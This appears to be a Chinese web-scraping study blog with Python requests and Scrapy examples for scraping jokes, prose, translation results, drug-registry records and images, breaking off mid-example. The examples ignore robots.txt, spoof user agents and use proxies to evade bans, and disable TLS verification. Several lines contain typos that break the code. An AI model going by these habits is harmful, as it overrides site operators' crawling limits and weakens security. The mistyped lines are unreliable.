Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n\n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  # HTTPCACHE_ENABLED = True\n  # HTTPCACHE_EXPIRATION_SECS = 0\n  # HTTPCACHE_DIR = &#39;httpcache&#39;\n  # HTTPCACHE_IGNORE_HTTP_CODES = []\n  # HTTPCACHE_STORAGE = &#39;scrapy.extensions.httpcache.FilesystemCacheStorage&#39;\n</code></pre><h4 id=\"spider-部分\"><a href=\"#spider-部分\" class=\"headerlink\" title=\"spider 部分\"></a>spider 部分</h4><pre><code class=\"python\">  # -*- coding: utf-8 -*-\n  import scrapy\n  from xiushi.items import XiushiItem\n\n\n  class XiushispiderSpider(scrapy.Spider):\n      name = &#39;xiushiSpider&#39;\n      allowed_domains = [&#39;qiushidabaike.com&#39;]\n      start_urls = [&#39;http://qiushidabaike.com/index_1.html&#39;]\n      base_domain = &#39;http://qiushidabaike.com&#39;\n\n      def parse(self, response):\n          duanzi = response.xpath(&#39;//div[@class=&quot;main-left fl&quot;]//dl&#39;)\n          for it in duanzi:\n              title = it.xpath(&#39;./dt/span/a/text()&#39;).get().strip()\n              text = it.xpath(&#39;./dd[@class=&quot;content&quot;]//text()&#39;).getall()\n              text = &quot;&quot;.join(text).strip()\n              item = XiushiItem(title=title, text=text)\n              yield item\n          # 进行翻页操作\n          next_url = response.xpath(&#39;//div[@class=&quot;page&quot;]//a[@class=&quot;next&quot;]/@href&#39;).get()\n          if not next_url:\n              return\n          else:\n              yield scrapy.Request(self.base_domain+next_url, callback=self.parse)\n</code></pre>\n<h4 id=\"pipelines-部分\"><a href=\"#pipelines-部分\" class=\"headerlink\" title=\"pipelines 部分\"></a>pipelines 部分</h4><pre><code class=\"python\">  # -*- coding: utf-8 -*-\n\n  # Define your item pipelines here\n  #\n  # Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting\n  # See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  &quot;&quot;&quot;\n  # 第一种方法，没进行json优化，但是看起来简单易操作\n  import json\n\n\n  class XiushiPipeline(object):\n      def __init__(self):\n          self.fp = open(&#39;duanzi.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;)\n\n      def open_spider(self, spider):\n          print(&#39;爬虫开始了...&#39;)\n\n      def process_item(self, item, spider):\n          item_json = json.dumps(dict(item),  ensure_ascii=False)\n          self.fp.write(item_json+&#39;\\n&#39;)\n          return item\n\n      def close_spider(self, spider):\n          self.fp.close()\n          print(&quot;爬虫结束了...&quot;)\n  &quot;&quot;&quot;\n  # 方案二，json优化，结果是每个字典存储在列表中\n  #        好处是满足json规则，坏处是数据量较大时比较耗内存\n  # &#39;&#39;&#39; 自我感觉这种方法不咋地 &#39;&#39;&#39;\n  # from scrapy.exporters import JsonItemExporter\n  #\n  #\n  # class XiushiPipeline(object):\n  #     def __init__(self):\n  #         # 注意此时以二进制形式写入\n  #         self.fp = open(&#39;duanzi.json&#39;, &#39;wb&#39;)\n  #         self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding=&#39;utf-8&#39;)\n  #         self.exporter.start_exporting()\n  #\n  #     def open_spider(self, spider):\n  #         print(&#39;爬虫开始了...&#39;)\n  #\n  #     def process_item(self, item, spider):\n  #         self.exporter.export_item(item)\n  #         return item\n  #\n  #     def close_spider(self, spider):\n  #         self.exporter.finish_exporting()\n  #         self.fp.close()\n  #         print(&quot;爬虫结束了...&quot;)\n\n  &#39;&#39;&#39;方案三&#39;&#39;&#39;\n  from scrapy.exporters import JsonLinesItemExporter\n\n\n  class XiushiPipeline(object):\n      def __init__(self):\n          # 注意此时以二进制形式写入\n          self.fp = open(&#39;duanzi.json&#39;, &#39;wb&#39;)\n          self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False, encoding=&#39;utf-8&#39;)\n\n      def open_spider(self, spider):\n          print(&#39;爬虫开始了...&#39;)\n\n      def process_item(self, item, spider):\n          self.exporter.export_item(item)\n          return item\n\n      def close_spider(self, spider):\n          self.fp.close()\n          print(&quot;爬虫结束了...&quot;)\n</code></pre>\n<ul>\n<li>可以在总文件中创建.py文件，代替爬虫开始命令 scrapy crawl xiushiSpider (注意应在爬虫目录下执行该命令)</li>\n</ul>\n<pre><code class=\"python\">from scrapy import cmdline\n\ncmdline.execute(&quot;scrapy crawl xiushiSpider&quot;.split())\n# cmdline.execute([&quot;scrapy&quot;, &#39;crawl&#39;, &#39;xiushiSpider&#39;])</code></pre>\n<h1 id=\"爬虫第六天\"><a href=\"#爬虫第六天\" class=\"headerlink\" title=\"爬虫第六天\"></a>爬虫第六天</h1><h3 id=\"scrapy-框架之spider类（示例二-爬取优美散文）\"><a href=\"#scrapy-框架之spider类（示例二-爬取优美散文）\" class=\"headerlink\" title=\"scrapy 框架之spider类（示例二.爬取优美散文）\"></a>scrapy 框架之spider类（示例二.爬取优美散文）</h3><ul>\n<li>item部分</li>\n</ul>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\n\n# Define here the models for your scraped items\n#\n# See documentation in:\n# https://doc.scrapy.org/en/latest/topics/items.html\n\nimport scrapy\n\n\nclass ProseItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    text = scrapy.Field()\n</code></pre>\n<ul>\n<li>settings部分</li>\n</ul>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\n\n# Scrapy settings for prose project\n#\n# For simplicity, this file contains only settings considered important or\n# commonly used. You can find more settings consulting the documentation:\n#\n#     https://doc.scrapy.org/en/latest/topics/settings.html\n#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\nBOT_NAME = &#39;prose&#39;\n\nSPIDER_MODULES = [&#39;prose.spiders&#39;]\nNEWSPIDER_MODULE = &#39;prose.spiders&#39;\n\n# Crawl responsibly by identifying yourself (and your website) on the user-agent\n# USER_AGENT = &#39;prose (+http://www.yourdomain.com)&#39;\n\n# Obey robots.txt rules\nROBOTSTXT_OBEY = False\n\n# Configure maximum concurrent requests performed by Scrapy (default: 16)\n# CONCURRENT_REQUESTS = 32\n\n# Configure a delay for requests for the same website (default: 0)\n# See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n# See also autothrottle settings and docs\nDOWNLOAD_DELAY = 1\n# The download delay setting will honor only one of:\n# CONCURRENT_REQUESTS_PER_DOMAIN = 16\n# CONCURRENT_REQUESTS_PER_IP = 16\n\n# Disable cookies (enabled by default)\n# COOKIES_ENABLED = False\n\n# Disable Telnet Console (enabled by default)\n# TELNETCONSOLE_ENABLED = False\n\n# Override the default request headers:\nDEFAULT_REQUEST_HEADERS = &#123;\n    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,\n    &#39;Accept-Language&#39;: &#39;en&#39;,\n    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#39;\n                  &#39;Chrome/80.0.3987.163 Safari/537.36 &#39;\n&#125;\n\n# Enable or disable spider middlewares\n# See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n# SPIDER_MIDDLEWARES = &#123;\n#    &#39;prose.middlewares.ProseSpiderMiddleware&#39;: 543,\n# &#125;\n\n# Enable or disable downloader middlewares\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n# DOWNLOADER_MIDDLEWARES = &#123;\n#    &#39;prose.middlewares.ProseDownloaderMiddleware&#39;: 543,\n# &#125;\n\n# Enable or disable extensions\n# See https://doc.scrapy.org/en/latest/topics/extensions.html\n# EXTENSIONS = &#123;\n#    &#39;scrapy.extensions.telnet.TelnetConsole&#39;: None,\n# &#125;\n\n# Configure item pipelines\n# See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\nITEM_PIPELINES = &#123;\n   &#39;prose.pipelines.ProsePipeline&#39;: 300,\n&#125;\n\n# Enable and configure the AutoThrottle extension (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n# AUTOTHROTTLE_ENABLED = True\n# The initial download delay\n# AUTOTHROTTLE_START_DELAY = 5\n# The maximum download delay to be set in case of high latencies\n# AUTOTHROTTLE_MAX_DELAY = 60\n# The average number of requests Scrapy should be sending in parallel to\n# each remote server\n# AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n# Enable showing throttling stats for every response received:\n# AUTOTHROTTLE_DEBUG = False\n\n# Enable and configure HTTP caching (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n# HTTPCACHE_ENABLED = True\n# HTTPCACHE_EXPIRATION_SECS = 0\n# HTTPCACHE_DIR = &#39;httpcache&#39;\n# HTTPCACHE_IGNORE_HTTP_CODES = []\n# HTTPCACHE_STORAGE = &#39;scrapy.extensions.httpcache.FilesystemCacheStorage&#39;\n</code></pre>\n<ul>\n<li>proseSpider部分</li>\n</ul>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\nimport scrapy\nfrom prose.items import ProseItem\n\n\nclass ProsespiderSpider(scrapy.Spider):\n    name = &#39;proseSpider&#39;\n    allowed_domains = [&#39;duwenzhang.com&#39;]\n    start_urls = [&#39;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#39;]\n    base_url = &#39;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#39;\n\n    def parse(self, response):\n        # xpath 选择不含有某一属性的标签\n        url_list = response.xpath(&#39;//center//tr[2]//td[(@valign) and not(@height)]/table&#39;)\n        for it in url_list:\n            title = it.xpath(&#39;.//tr[2]//td[@height=&quot;26&quot;]/b/a/text()&#39;).getall()\n            text = it.xpath(&#39;.//tr[4]/td[@style=&quot;padding-left:3px&quot;]/text()&#39;).getall()\n            text = &quot;&quot;.join(text).strip()\n            item = ProseItem(title=title, text=text)\n            yield item\n        # //a[contains(text(), &quot;百度搜索&quot;)]  【可以部分检索】\n        # //a[text()=&quot;文字内容&quot;] 【需要填全】 xpath定位指定文本标签\n        next_url = response.xpath(&#39;//tr//a[text()=&quot;下一页&quot;]/@href&#39;).get()\n        if not next_url:\n            return\n        else:\n            yield scrapy.Request(self.base_url+next_url, callback=self.parse)\n\n</code></pre>\n<ul>\n<li>piplines 部分</li>\n</ul>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\n\n# Define your item pipelines here\n#\n# Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting\n# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n\nimport json\nfrom scrapy.exporters import JsonLinesItemExporter\n\n\nclass ProsePipeline(object):\n    def __init__(self):\n        self.fp = open(&#39;prose.json&#39;, &#39;wb&#39;)\n        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False,\n                                              encoding=&#39;utf-8&#39;)\n\n    def open_spider(self, spider):\n        print(&#39;爬虫开始了...&#39;)\n\n    def process_item(self, item, spider):\n        self.exporter.export_item(item)\n        return item\n\n    def close_spider(self, spider):\n        self.fp.close()\n        print(&#39;爬虫结束了....&#39;)</code></pre>\n","site":{"data":{}},"excerpt":"<h1 id=\"爬虫第一天\"><a href=\"#爬虫第一天\" class=\"headerlink\" title=\"爬虫第一天\"></a>爬虫第一天</h1><ul>\n<li>urllib太过古老，因此不加以深入学习</li>\n</ul>\n<h3 id=\"requests\"><a href=\"#requests\" class=\"headerlink\" title=\"requests\"></a>requests</h3><p>requests模块：python中原生的一款基于网络请求的模块，功能强大，简单便捷，效率高。<br>作用：模拟浏览器发送请求。</p>\n<p>如何使用：（requests模块的编码流程）<br>    -指定url<br>    -发起请求（get或post）<br>    -获取响应数据<br>    -持久化存储（数据库或本地存储）</p>\n<p>环境安装：<br>    -pip或pycharm安装<br>    -anaconda自带（方便已装）</p>","more":"<h3 id=\"实战编码：\"><a href=\"#实战编码：\" class=\"headerlink\" title=\"实战编码：\"></a><strong>实战编码：</strong></h3><pre><code>- 需求：爬取拉勾网首页的数据\n    示例：</code></pre><pre><code class=\"python\">import requests\n\nif __name__ == &#39;__main__&#39;:\n    #step 1:指定url\n    url = &quot;https://www.lagou.com/jobs/6889986.html?show=96e52fa1d2134ad483eac5662bcc9fc6&quot;\n\n    #step_2:发起请求\n    #get会返回一个响应对象\n    response = requests.get(url=url)\n\n    #step_3:获取相应数据(.text返回的是字符串形式的响应数据)\n    page_text = response.text\n    print(page_text)\n\n    #step_4:持久化存储\n    with open(&#39;./lagou.html&#39;, &#39;w&#39;, encoding = &#39;utf-8&#39;) as fp:\n        fp.write(page_text)\n    print(&#39;爬取数据结束&#39;)</code></pre>\n<ul>\n<li><p>以上代码极有可能会被网站捕获，被识别出为爬虫，所以需要实施反爬虫策略</p>\n</li>\n<li><p>示例：<br>UA:User-Agent (请求载体的身份标识)<br>UA检测：门户网站的服务器会检测对应的载体身份标识，如果检测到请求的载体身份标识为某一款浏览器，<br>说明该请求是一个正常的请求。但是，如果监测到请求的载体身份标识不是基于某一款浏览器的，则表示<br>该请求为不正常的请求（爬虫），则服务器端就很有可能拒绝这次请求。<br>UA伪装:将对应的请求载体身份标识伪装成一款浏览器</p>\n</li>\n</ul>\n<pre><code class=\"python\">import requests\n\nif __name__ == &#39;__main__&#39;:\n    # UA伪装：将对应的User-Agent封装到一个字典中\n    headers = &#123;\n        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n\n    url = &#39;https://www.sogou.com/web?&#39;\n\n    #处理url携带的参数：封装到字典中（参数为问号后面的）\n    kw = input(&#39;enter a word:&#39;)\n    param = &#123;\n        &#39;query&#39;: kw\n    &#125;\n\n    # 需求的响应返回的是一个对象，对象应实例化\n    response = requests.get(url=url, params=param, headers=headers)\n\n    # 确认相应数据是txt类型的\n    page_text = response.text\n    fileName = kw+&#39;.html&#39;\n    with open(fileName, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:\n        fp.write(page_text)\n    print(&#39;保存成功。。。&#39;)\n</code></pre>\n<h1 id=\"爬虫第二天\"><a href=\"#爬虫第二天\" class=\"headerlink\" title=\"爬虫第二天\"></a>爬虫第二天</h1><h3 id=\"有关于ajax\"><a href=\"#有关于ajax\" class=\"headerlink\" title=\"有关于ajax\"></a>有关于ajax</h3><h4 id=\"爬取百度翻译的内容\"><a href=\"#爬取百度翻译的内容\" class=\"headerlink\" title=\"爬取百度翻译的内容\"></a>爬取百度翻译的内容</h4><pre><code class=\"python\">import requests\nimport json\n\nif __name__ == &#39;__main__&#39;:\n    #获取url\n    post_url = &#39;https://fanyi.baidu.com/sug&#39;\n    #进行UA伪装\n    headers = &#123;\n        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n    #post请求的参数处理（同get请求一致）\n    word = input(&#39;输入你想翻译的东西:&#39;)\n    data = &#123;\n        &#39;kw&#39;: word\n    &#125;\n    #发送请求并生成响应\n    response = requests.post(url=post_url, data=data, headers=headers)\n    #获取响应数据:\n    #json()方法返回的是obj （如果确认响应数据是json类型的）\n    dic_obj = response.json()\n\n    #持久化存储\n    filename = word+&#39;.json&#39;\n    with open(filename, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:\n        json.dump(dic_obj, fp=fp, ensure_ascii=False)\n\n    #将jaon格式转化成dict格式\n    with open(filename, &#39;r&#39;, encoding=&#39;utf-8&#39;) as fp:\n        great = json.load(fp)\n\n    #将字典格式化输出(此字典中存在字典与列表的嵌套现象)\n    for k, v in great.items():\n        if type(v) == list:\n            for i in v:\n                print(i)\n        else:\n            print(k)\n            print(v)\n\n    print(&#39;end...&#39;)\n</code></pre>\n<h3 id=\"爬取豆瓣电影信息\"><a href=\"#爬取豆瓣电影信息\" class=\"headerlink\" title=\"爬取豆瓣电影信息\"></a>爬取豆瓣电影信息</h3><pre><code class=\"python\">##此处代码示例为失败的例子，未考虑到由ajax得到的页面依旧采用了ajax\n\nimport requests\nimport json\n\nif __name__ == &#39;__main__&#39;:\n    url = &#39;https://movie.douban.com/j/chart/top_list&#39;\n    param = &#123;\n        &#39;type&#39;: &#39; 24&#39;,\n        &#39;interval_id&#39;: &#39; 100:90&#39;,\n        &#39;action&#39;: &#39;&#39;,\n        &#39;start&#39;: &#39; 1&#39;,\n        &#39;limit&#39;: &#39; 20&#39;,\n    &#125;\n    headers = &#123;\n        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n\n    response = requests.get(url=url, params=param, headers=headers)\n\n    list_data = response.json()\n\n    with open(&#39;./douban.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:\n        json.dump(list_data, fp, ensure_ascii=False)\n\n    with open(&#39;./douban.json&#39;, &#39;r&#39;, encoding=&#39;utf-8&#39;) as fp:\n        great = json.load(fp)\n\n    print(great)</code></pre>\n<h1 id=\"爬虫学习第三天\"><a href=\"#爬虫学习第三天\" class=\"headerlink\" title=\"爬虫学习第三天\"></a>爬虫学习第三天</h1><h3 id=\"爬取国家药监总局部分信息\"><a href=\"#爬取国家药监总局部分信息\" class=\"headerlink\" title=\"爬取国家药监总局部分信息\"></a>爬取国家药监总局部分信息</h3><pre><code class=\"python\">import requests\nimport json\n\nif __name__ == &#39;__main__&#39;:\n    url = &#39;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsList&#39;\n    url_2 = &#39;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsById&#39;\n    headers = &#123;\n        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n    #爬取的页数\n    page_ = input(&quot;请输入您想爬取的信息页数：&quot;)\n    for page in range(1, int(page_)+1):\n        data = &#123;\n            &#39;on&#39;: &#39;true&#39;,\n            &#39;page&#39;: page,\n            &#39;pageSize&#39;: &#39;15&#39;,\n            &#39;productName&#39;: &#39;&#39;,\n            &#39;conditionType&#39;: &#39;1&#39;,\n            &#39;applyname&#39;: &#39;&#39;,\n            &#39;applysn&#39;: &#39;&#39;,\n        &#125;\n        #id_list have many ids\n        id_list = []\n        message = []\n\n        json_list = requests.post(url=url, data=data, headers=headers).json()\n        #id_a is a dict\n        for id_a in json_list[&quot;list&quot;]:\n            id_list.append(id_a[&quot;ID&quot;])\n            #id_b是id号\n        for id_b in id_list:\n                data_2 = &#123;\n                    &quot;id&quot;: str(id_b)\n                &#125;\n                detail_message = requests.post(url=url_2, data=data_2, headers=headers).json()\n                print(detail_message)\n                message.append(detail_message)\n    with open(&#39;./药物信息.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:\n        json.dump(message, fp, ensure_ascii=False)\n    print(&#39;end...&#39;)\n\n&#39;&#39;&#39;此代码爬取时间可能有些长，也有可能会出现Timeouterror错误，多试几次可能就可以了&#39;&#39;&#39;\n&#39;&#39;&#39;出现这种情况的原因是对方服务器拒绝请求（反爬虫），，，后续继续学习反反爬虫技术&#39;&#39;&#39;</code></pre>\n<h3 id=\"数据解析概述\"><a href=\"#数据解析概述\" class=\"headerlink\" title=\"数据解析概述\"></a>数据解析概述</h3><ul>\n<li><p>聚焦爬虫：爬取页面中指定的页面内容</p>\n<pre><code>-编码流程\n    1、指定url\n    2、发起请求\n    3、获取相应数据\n    4、持久化存储</code></pre><p>-数据解析分类：</p>\n<pre><code>    -正则\n    -bs4\n    -xpath</code></pre><p>-数据解析原理概述</p>\n<pre><code>    -解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储\n    -1、进行指定标签的定位\n    -2、标签或者标签对应属性中存储的数据值进行提取（解析）</code></pre></li>\n</ul>\n<h3 id=\"图片的爬取代码\"><a href=\"#图片的爬取代码\" class=\"headerlink\" title=\"图片的爬取代码\"></a>图片的爬取代码</h3><pre><code class=\"python\">import requests\n#此处url为图片地址，而非链接【地址比链接短】\nurl = &#39;https://tse4-mm.cn.bing.net/th/id/OIP.vLPcBX_5hWArkIbn_PqvYgHaGL?w=233&amp;h=195&amp;c=7&amp;o=5&amp;dpr=1.25&amp;pid=1.7&#39;\nheaders = &#123;\n        &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n&#125;\n#图片以二进制的形式存储，所以以.content形式接收，以jpg格式存\ndata_pict = requests.get(url=url, headers=headers).content\nwith open(&#39;./beauty_pict.jpg&#39;, &#39;wb&#39;) as fp:\n    fp.write(data_pict)</code></pre>\n<h1 id=\"爬虫第四天\"><a href=\"#爬虫第四天\" class=\"headerlink\" title=\"爬虫第四天\"></a>爬虫第四天</h1><h3 id=\"爬取百度图片（星空图片）\"><a href=\"#爬取百度图片（星空图片）\" class=\"headerlink\" title=\"爬取百度图片（星空图片）\"></a>爬取百度图片（星空图片）</h3><pre><code class=\"python\">import requests\nimport re\nimport os\nimport time\n\nif __name__ == &#39;__main__&#39;:\n    #创建一个文件夹，存放图片\n    if not os.path.exists(&#39;./star_sky&#39;):\n        os.mkdir(&#39;./star_sky&#39;)\n\n    url = &#39;https://cn.bing.com/images/search?q=%E6%98%9F%E7%A9%BA%E5%9B%BE%E7%89%87&amp;qpvt=%e6%98%9f%e7%a9%ba%e5%9b%be%e7%89%87&amp;form=IGRE&amp;first=1&amp;cw=1117&amp;ch=714&#39;\n    headers = &#123;\n            &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n    data_pict = requests.get(url=url, headers=headers).text\n\n    #正则匹配\n    ex = &#39;&lt;a class=.*?murl&amp;quot;:&amp;quot;(.*?)&amp;quot;.*?&gt;&#39;\n    star_list = re.findall(ex, data_pict, re.S)\n    for i in star_list:\n        url_2 = i\n        #请求到了图片的二进制数据\n        data_2_pict = requests.get(url=url_2, headers=headers).content\n        #为图片设置名称\n        img_name = url_2.split(&quot;/&quot;)[-1]\n        img_path = &#39;./star_sky/&#39; + img_name\n        with open(img_path, &#39;wb&#39;) as fp:\n            fp.write(data_2_pict)\n        print(img_name + &#39;...successful&#39;)\n        time.sleep(0.1)\n\n****************************************未完，，待更新********************************************</code></pre>\n<h3 id=\"xpath\"><a href=\"#xpath\" class=\"headerlink\" title=\"xpath\"></a>xpath</h3><ul>\n<li>xpath解析：最常用且最便捷高效的一种解析方式，具有通用性<pre><code>-xpath解析原理：\n    -1、实例化一个etree对象，且需要将被解析的页面源码数据加载到该对象中\n    -2、调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获\n-如何实例化一个etree对象\n    *from lxml import etree\n    -1、将 本地的html文档中的源代码数据加载到etree对象中：\n        etree.parse(filepath)\n    -2、可以将从互联网上获取的数据加载到该对象中\n        etree.HTML(&#39;page_text&#39;)###page_text就是获取的响应数据\n    - xpath(&#39;xpath表达式&#39;)\n    -xpath表达式：\n            - / ：表示的是从根目录结点开始定位，表示的是一个层级\n                    - // : 表示的是多个层级或从任意位置开始定位（前提是//前面没有结点）\n                    -属性定位：tag[@attrName=&quot;attrValue&quot;]\n                    -索引定位：p[n] 索引是从1开始的\n                    -取文本：\n        - /text() 获取的是标签中直系的文本内容\n        - //text() 标签中非直系的文本内容（所有的文本内容）\n        -[0] 可以去除列表框\n            -取属性\n        -/@attrName</code></pre></li>\n</ul>\n<h3 id=\"xpath代码实战示例：\"><a href=\"#xpath代码实战示例：\" class=\"headerlink\" title=\"xpath代码实战示例：\"></a>xpath代码实战示例：</h3><pre><code class=\"python\">#爬取妹子图片，总共有俩千多张\nimport requests\nfrom lxml import etree\nimport os\n\nif __name__ == &#39;__main__&#39;:\n    ii = 1\n    if not os.path.exists(&#39;./girl&#39;):\n        os.mkdir(&#39;./girl&#39;)\n    url_list = [i for i in range(1, 50)]\n    url_list[1] = &#39;&#39;\n\n    for page in url_list:\n        url = &#39;https://www.lanvshen.com/zhongguo/&#39; + str(page) +&#39;.html&#39;\n        headers = &#123;\n            &#39;User-Agent&#39; : &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n        &#125;\n        get_text = requests.get(url=url, headers=headers)\n        tree = etree.HTML(get_text.text)\n        pict_ = tree.xpath(&#39;//div[@class=&quot;hezi&quot;]//li&#39;)\n        for it_ in pict_:\n            img_url = it_.xpath(&#39;./a/img/@src&#39;)[0]\n            img_name = str(ii) + &#39;.jpg&#39;\n            img = requests.get(url=img_url, headers=headers).content\n            img_path = &#39;./girl/&#39; + img_name\n            with open(img_path, &#39;wb&#39;) as fp:\n                fp.write(img)\n            print(img_name + &#39;sccuessful...&#39;)\n            ii = ii + 1\n\n##此代码存在许多不足之处，所爬取的图片都只是像素低的缩略图，并且下载速度较慢\n##后期将学习爬取高清图片，并进行分布式爬取\n</code></pre>\n<h3 id=\"ip代理\"><a href=\"#ip代理\" class=\"headerlink\" title=\"ip代理\"></a>ip代理</h3><ol>\n<li>代理的原理：在请求目的网站之前，先请求代理服务器，然后让代理服务器去请求目的网站，<br>代理服务器拿到目的网站的数据后，再转发给我们的代码</li>\n<li><a href=\"http://httpbin.org\">这个网站可以方便的查看http请求的一些参数</a> </li>\n<li>在代码中(requests模块)使用代理：</li>\n</ol>\n<pre><code class=\"python\">    import requests\n\n    url = &#39;http://httpbin.org&#39;\n    headers = &#123;\n        &#39;User-Anget&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n\n    #设置代理\n    proxy = &#123;\n        &#39;http&#39;: &#39;123.54.194.96:38661&#39;\n    &#125;\n    get_text = requerts.get(url=url, headers=headers, proxies=proxy).text\n    print(get_text)</code></pre>\n<ol start=\"4\">\n<li>网络代理有付费和不需要付费的，不需要付费的不稳定，常常会失效</li>\n<li>代理的作用是防止我们在爬取服务器的数据时被反爬虫而被封禁导致我们<br>的 ip 不能用而采取的措施，选择代理应选择隐蔽性高，不透明的</li>\n</ol>\n<h3 id=\"cookie\"><a href=\"#cookie\" class=\"headerlink\" title=\"cookie\"></a>cookie</h3><ul>\n<li><p><a href=\"http://blog.sina.com.cn/s/blog_628571e601019uis.html\">cookie与session的差异</a></p>\n</li>\n<li><p><a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=200538817&idx=2&sn=1147d48f2320fa37e82a7daef4f31c11#rd\">cookie技术深入</a>             </p>\n<ul>\n<li>Cookie是什么？     </li>\n</ul>\n<p>Cookie 是一小段文本信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。<br>Cookie 包含每次用户访问站点时 Web 应用程序都可以读取的信息。</p>\n<ul>\n<li><p>为什么需要Cookie？ </p>\n<p>因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。<br>所以，需要额外的数据用于维护会话。Cookie 正是这样的一段随HTTP请求一起被传递的额外数据。</p>\n</li>\n<li><p>Cookie能做什么？ </p>\n<p>Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求被发送到服务器，所以应该保证它<br>不要太大。Cookie的内容也是明文保存的，有些浏览器提供界面修改，所以， 不适合保存重要的或者涉及隐私的内容。</p>\n</li>\n<li><p>Cookie 的限制</p>\n<p>大多数浏览器支持最大为 4096 字节的 Cookie。由于这限制了 Cookie 的大小，最好用 Cookie 来存储少量数据，<br>或者存储用户 ID 之类的标识符。用户 ID 随后便可用于标识用户，以及从数据库或其他数据源中读取用户信息。<br>浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；<br>如果试图存储更多 Cookie，则最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie<br>总数作出绝对限制，通常为 300 个。</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"C:/Users/Acer/Desktop/%E7%AC%94%E8%AE%B0/%E7%88%AC%E8%99%AB_day4_files/1.jpg\" alt=\"Cookie示意图\">    </p>\n<ul>\n<li>处理cookie<br>如果想要在多次请求中共享cookie，那么应该使用session</li>\n</ul>\n<h3 id=\"处理不信任的SSL证书\"><a href=\"#处理不信任的SSL证书\" class=\"headerlink\" title=\"处理不信任的SSL证书\"></a>处理不信任的SSL证书</h3><pre><code class=\"python\">resp = resquests.get(url=url, vrrify=False).content\n</code></pre>\n<h3 id=\"多线程\"><a href=\"#多线程\" class=\"headerlink\" title=\"多线程\"></a>多线程</h3><ul>\n<li>多线程之生产者与消费者模型</li>\n</ul>\n<ul>\n<li>代码示例一：(Lock版)</li>\n</ul>\n<pre><code class=\"python\">    &quot;&quot;&quot;\n    关于多线程生产者消费者模型\n    &quot;&quot;&quot;\n    import threading\n    import time\n    import random\n\n    gMoney = 1000\n    gLock = threading.Lock()\n    gTotalTimes = 10\n    gTimes = 0\n\n\n    # 生产线程Producer\n    class Producer(threading.Thread):\n        def run(self):\n            global gMoney\n            global gTimes\n            while True:\n                money = random.randint(100, 1000)\n                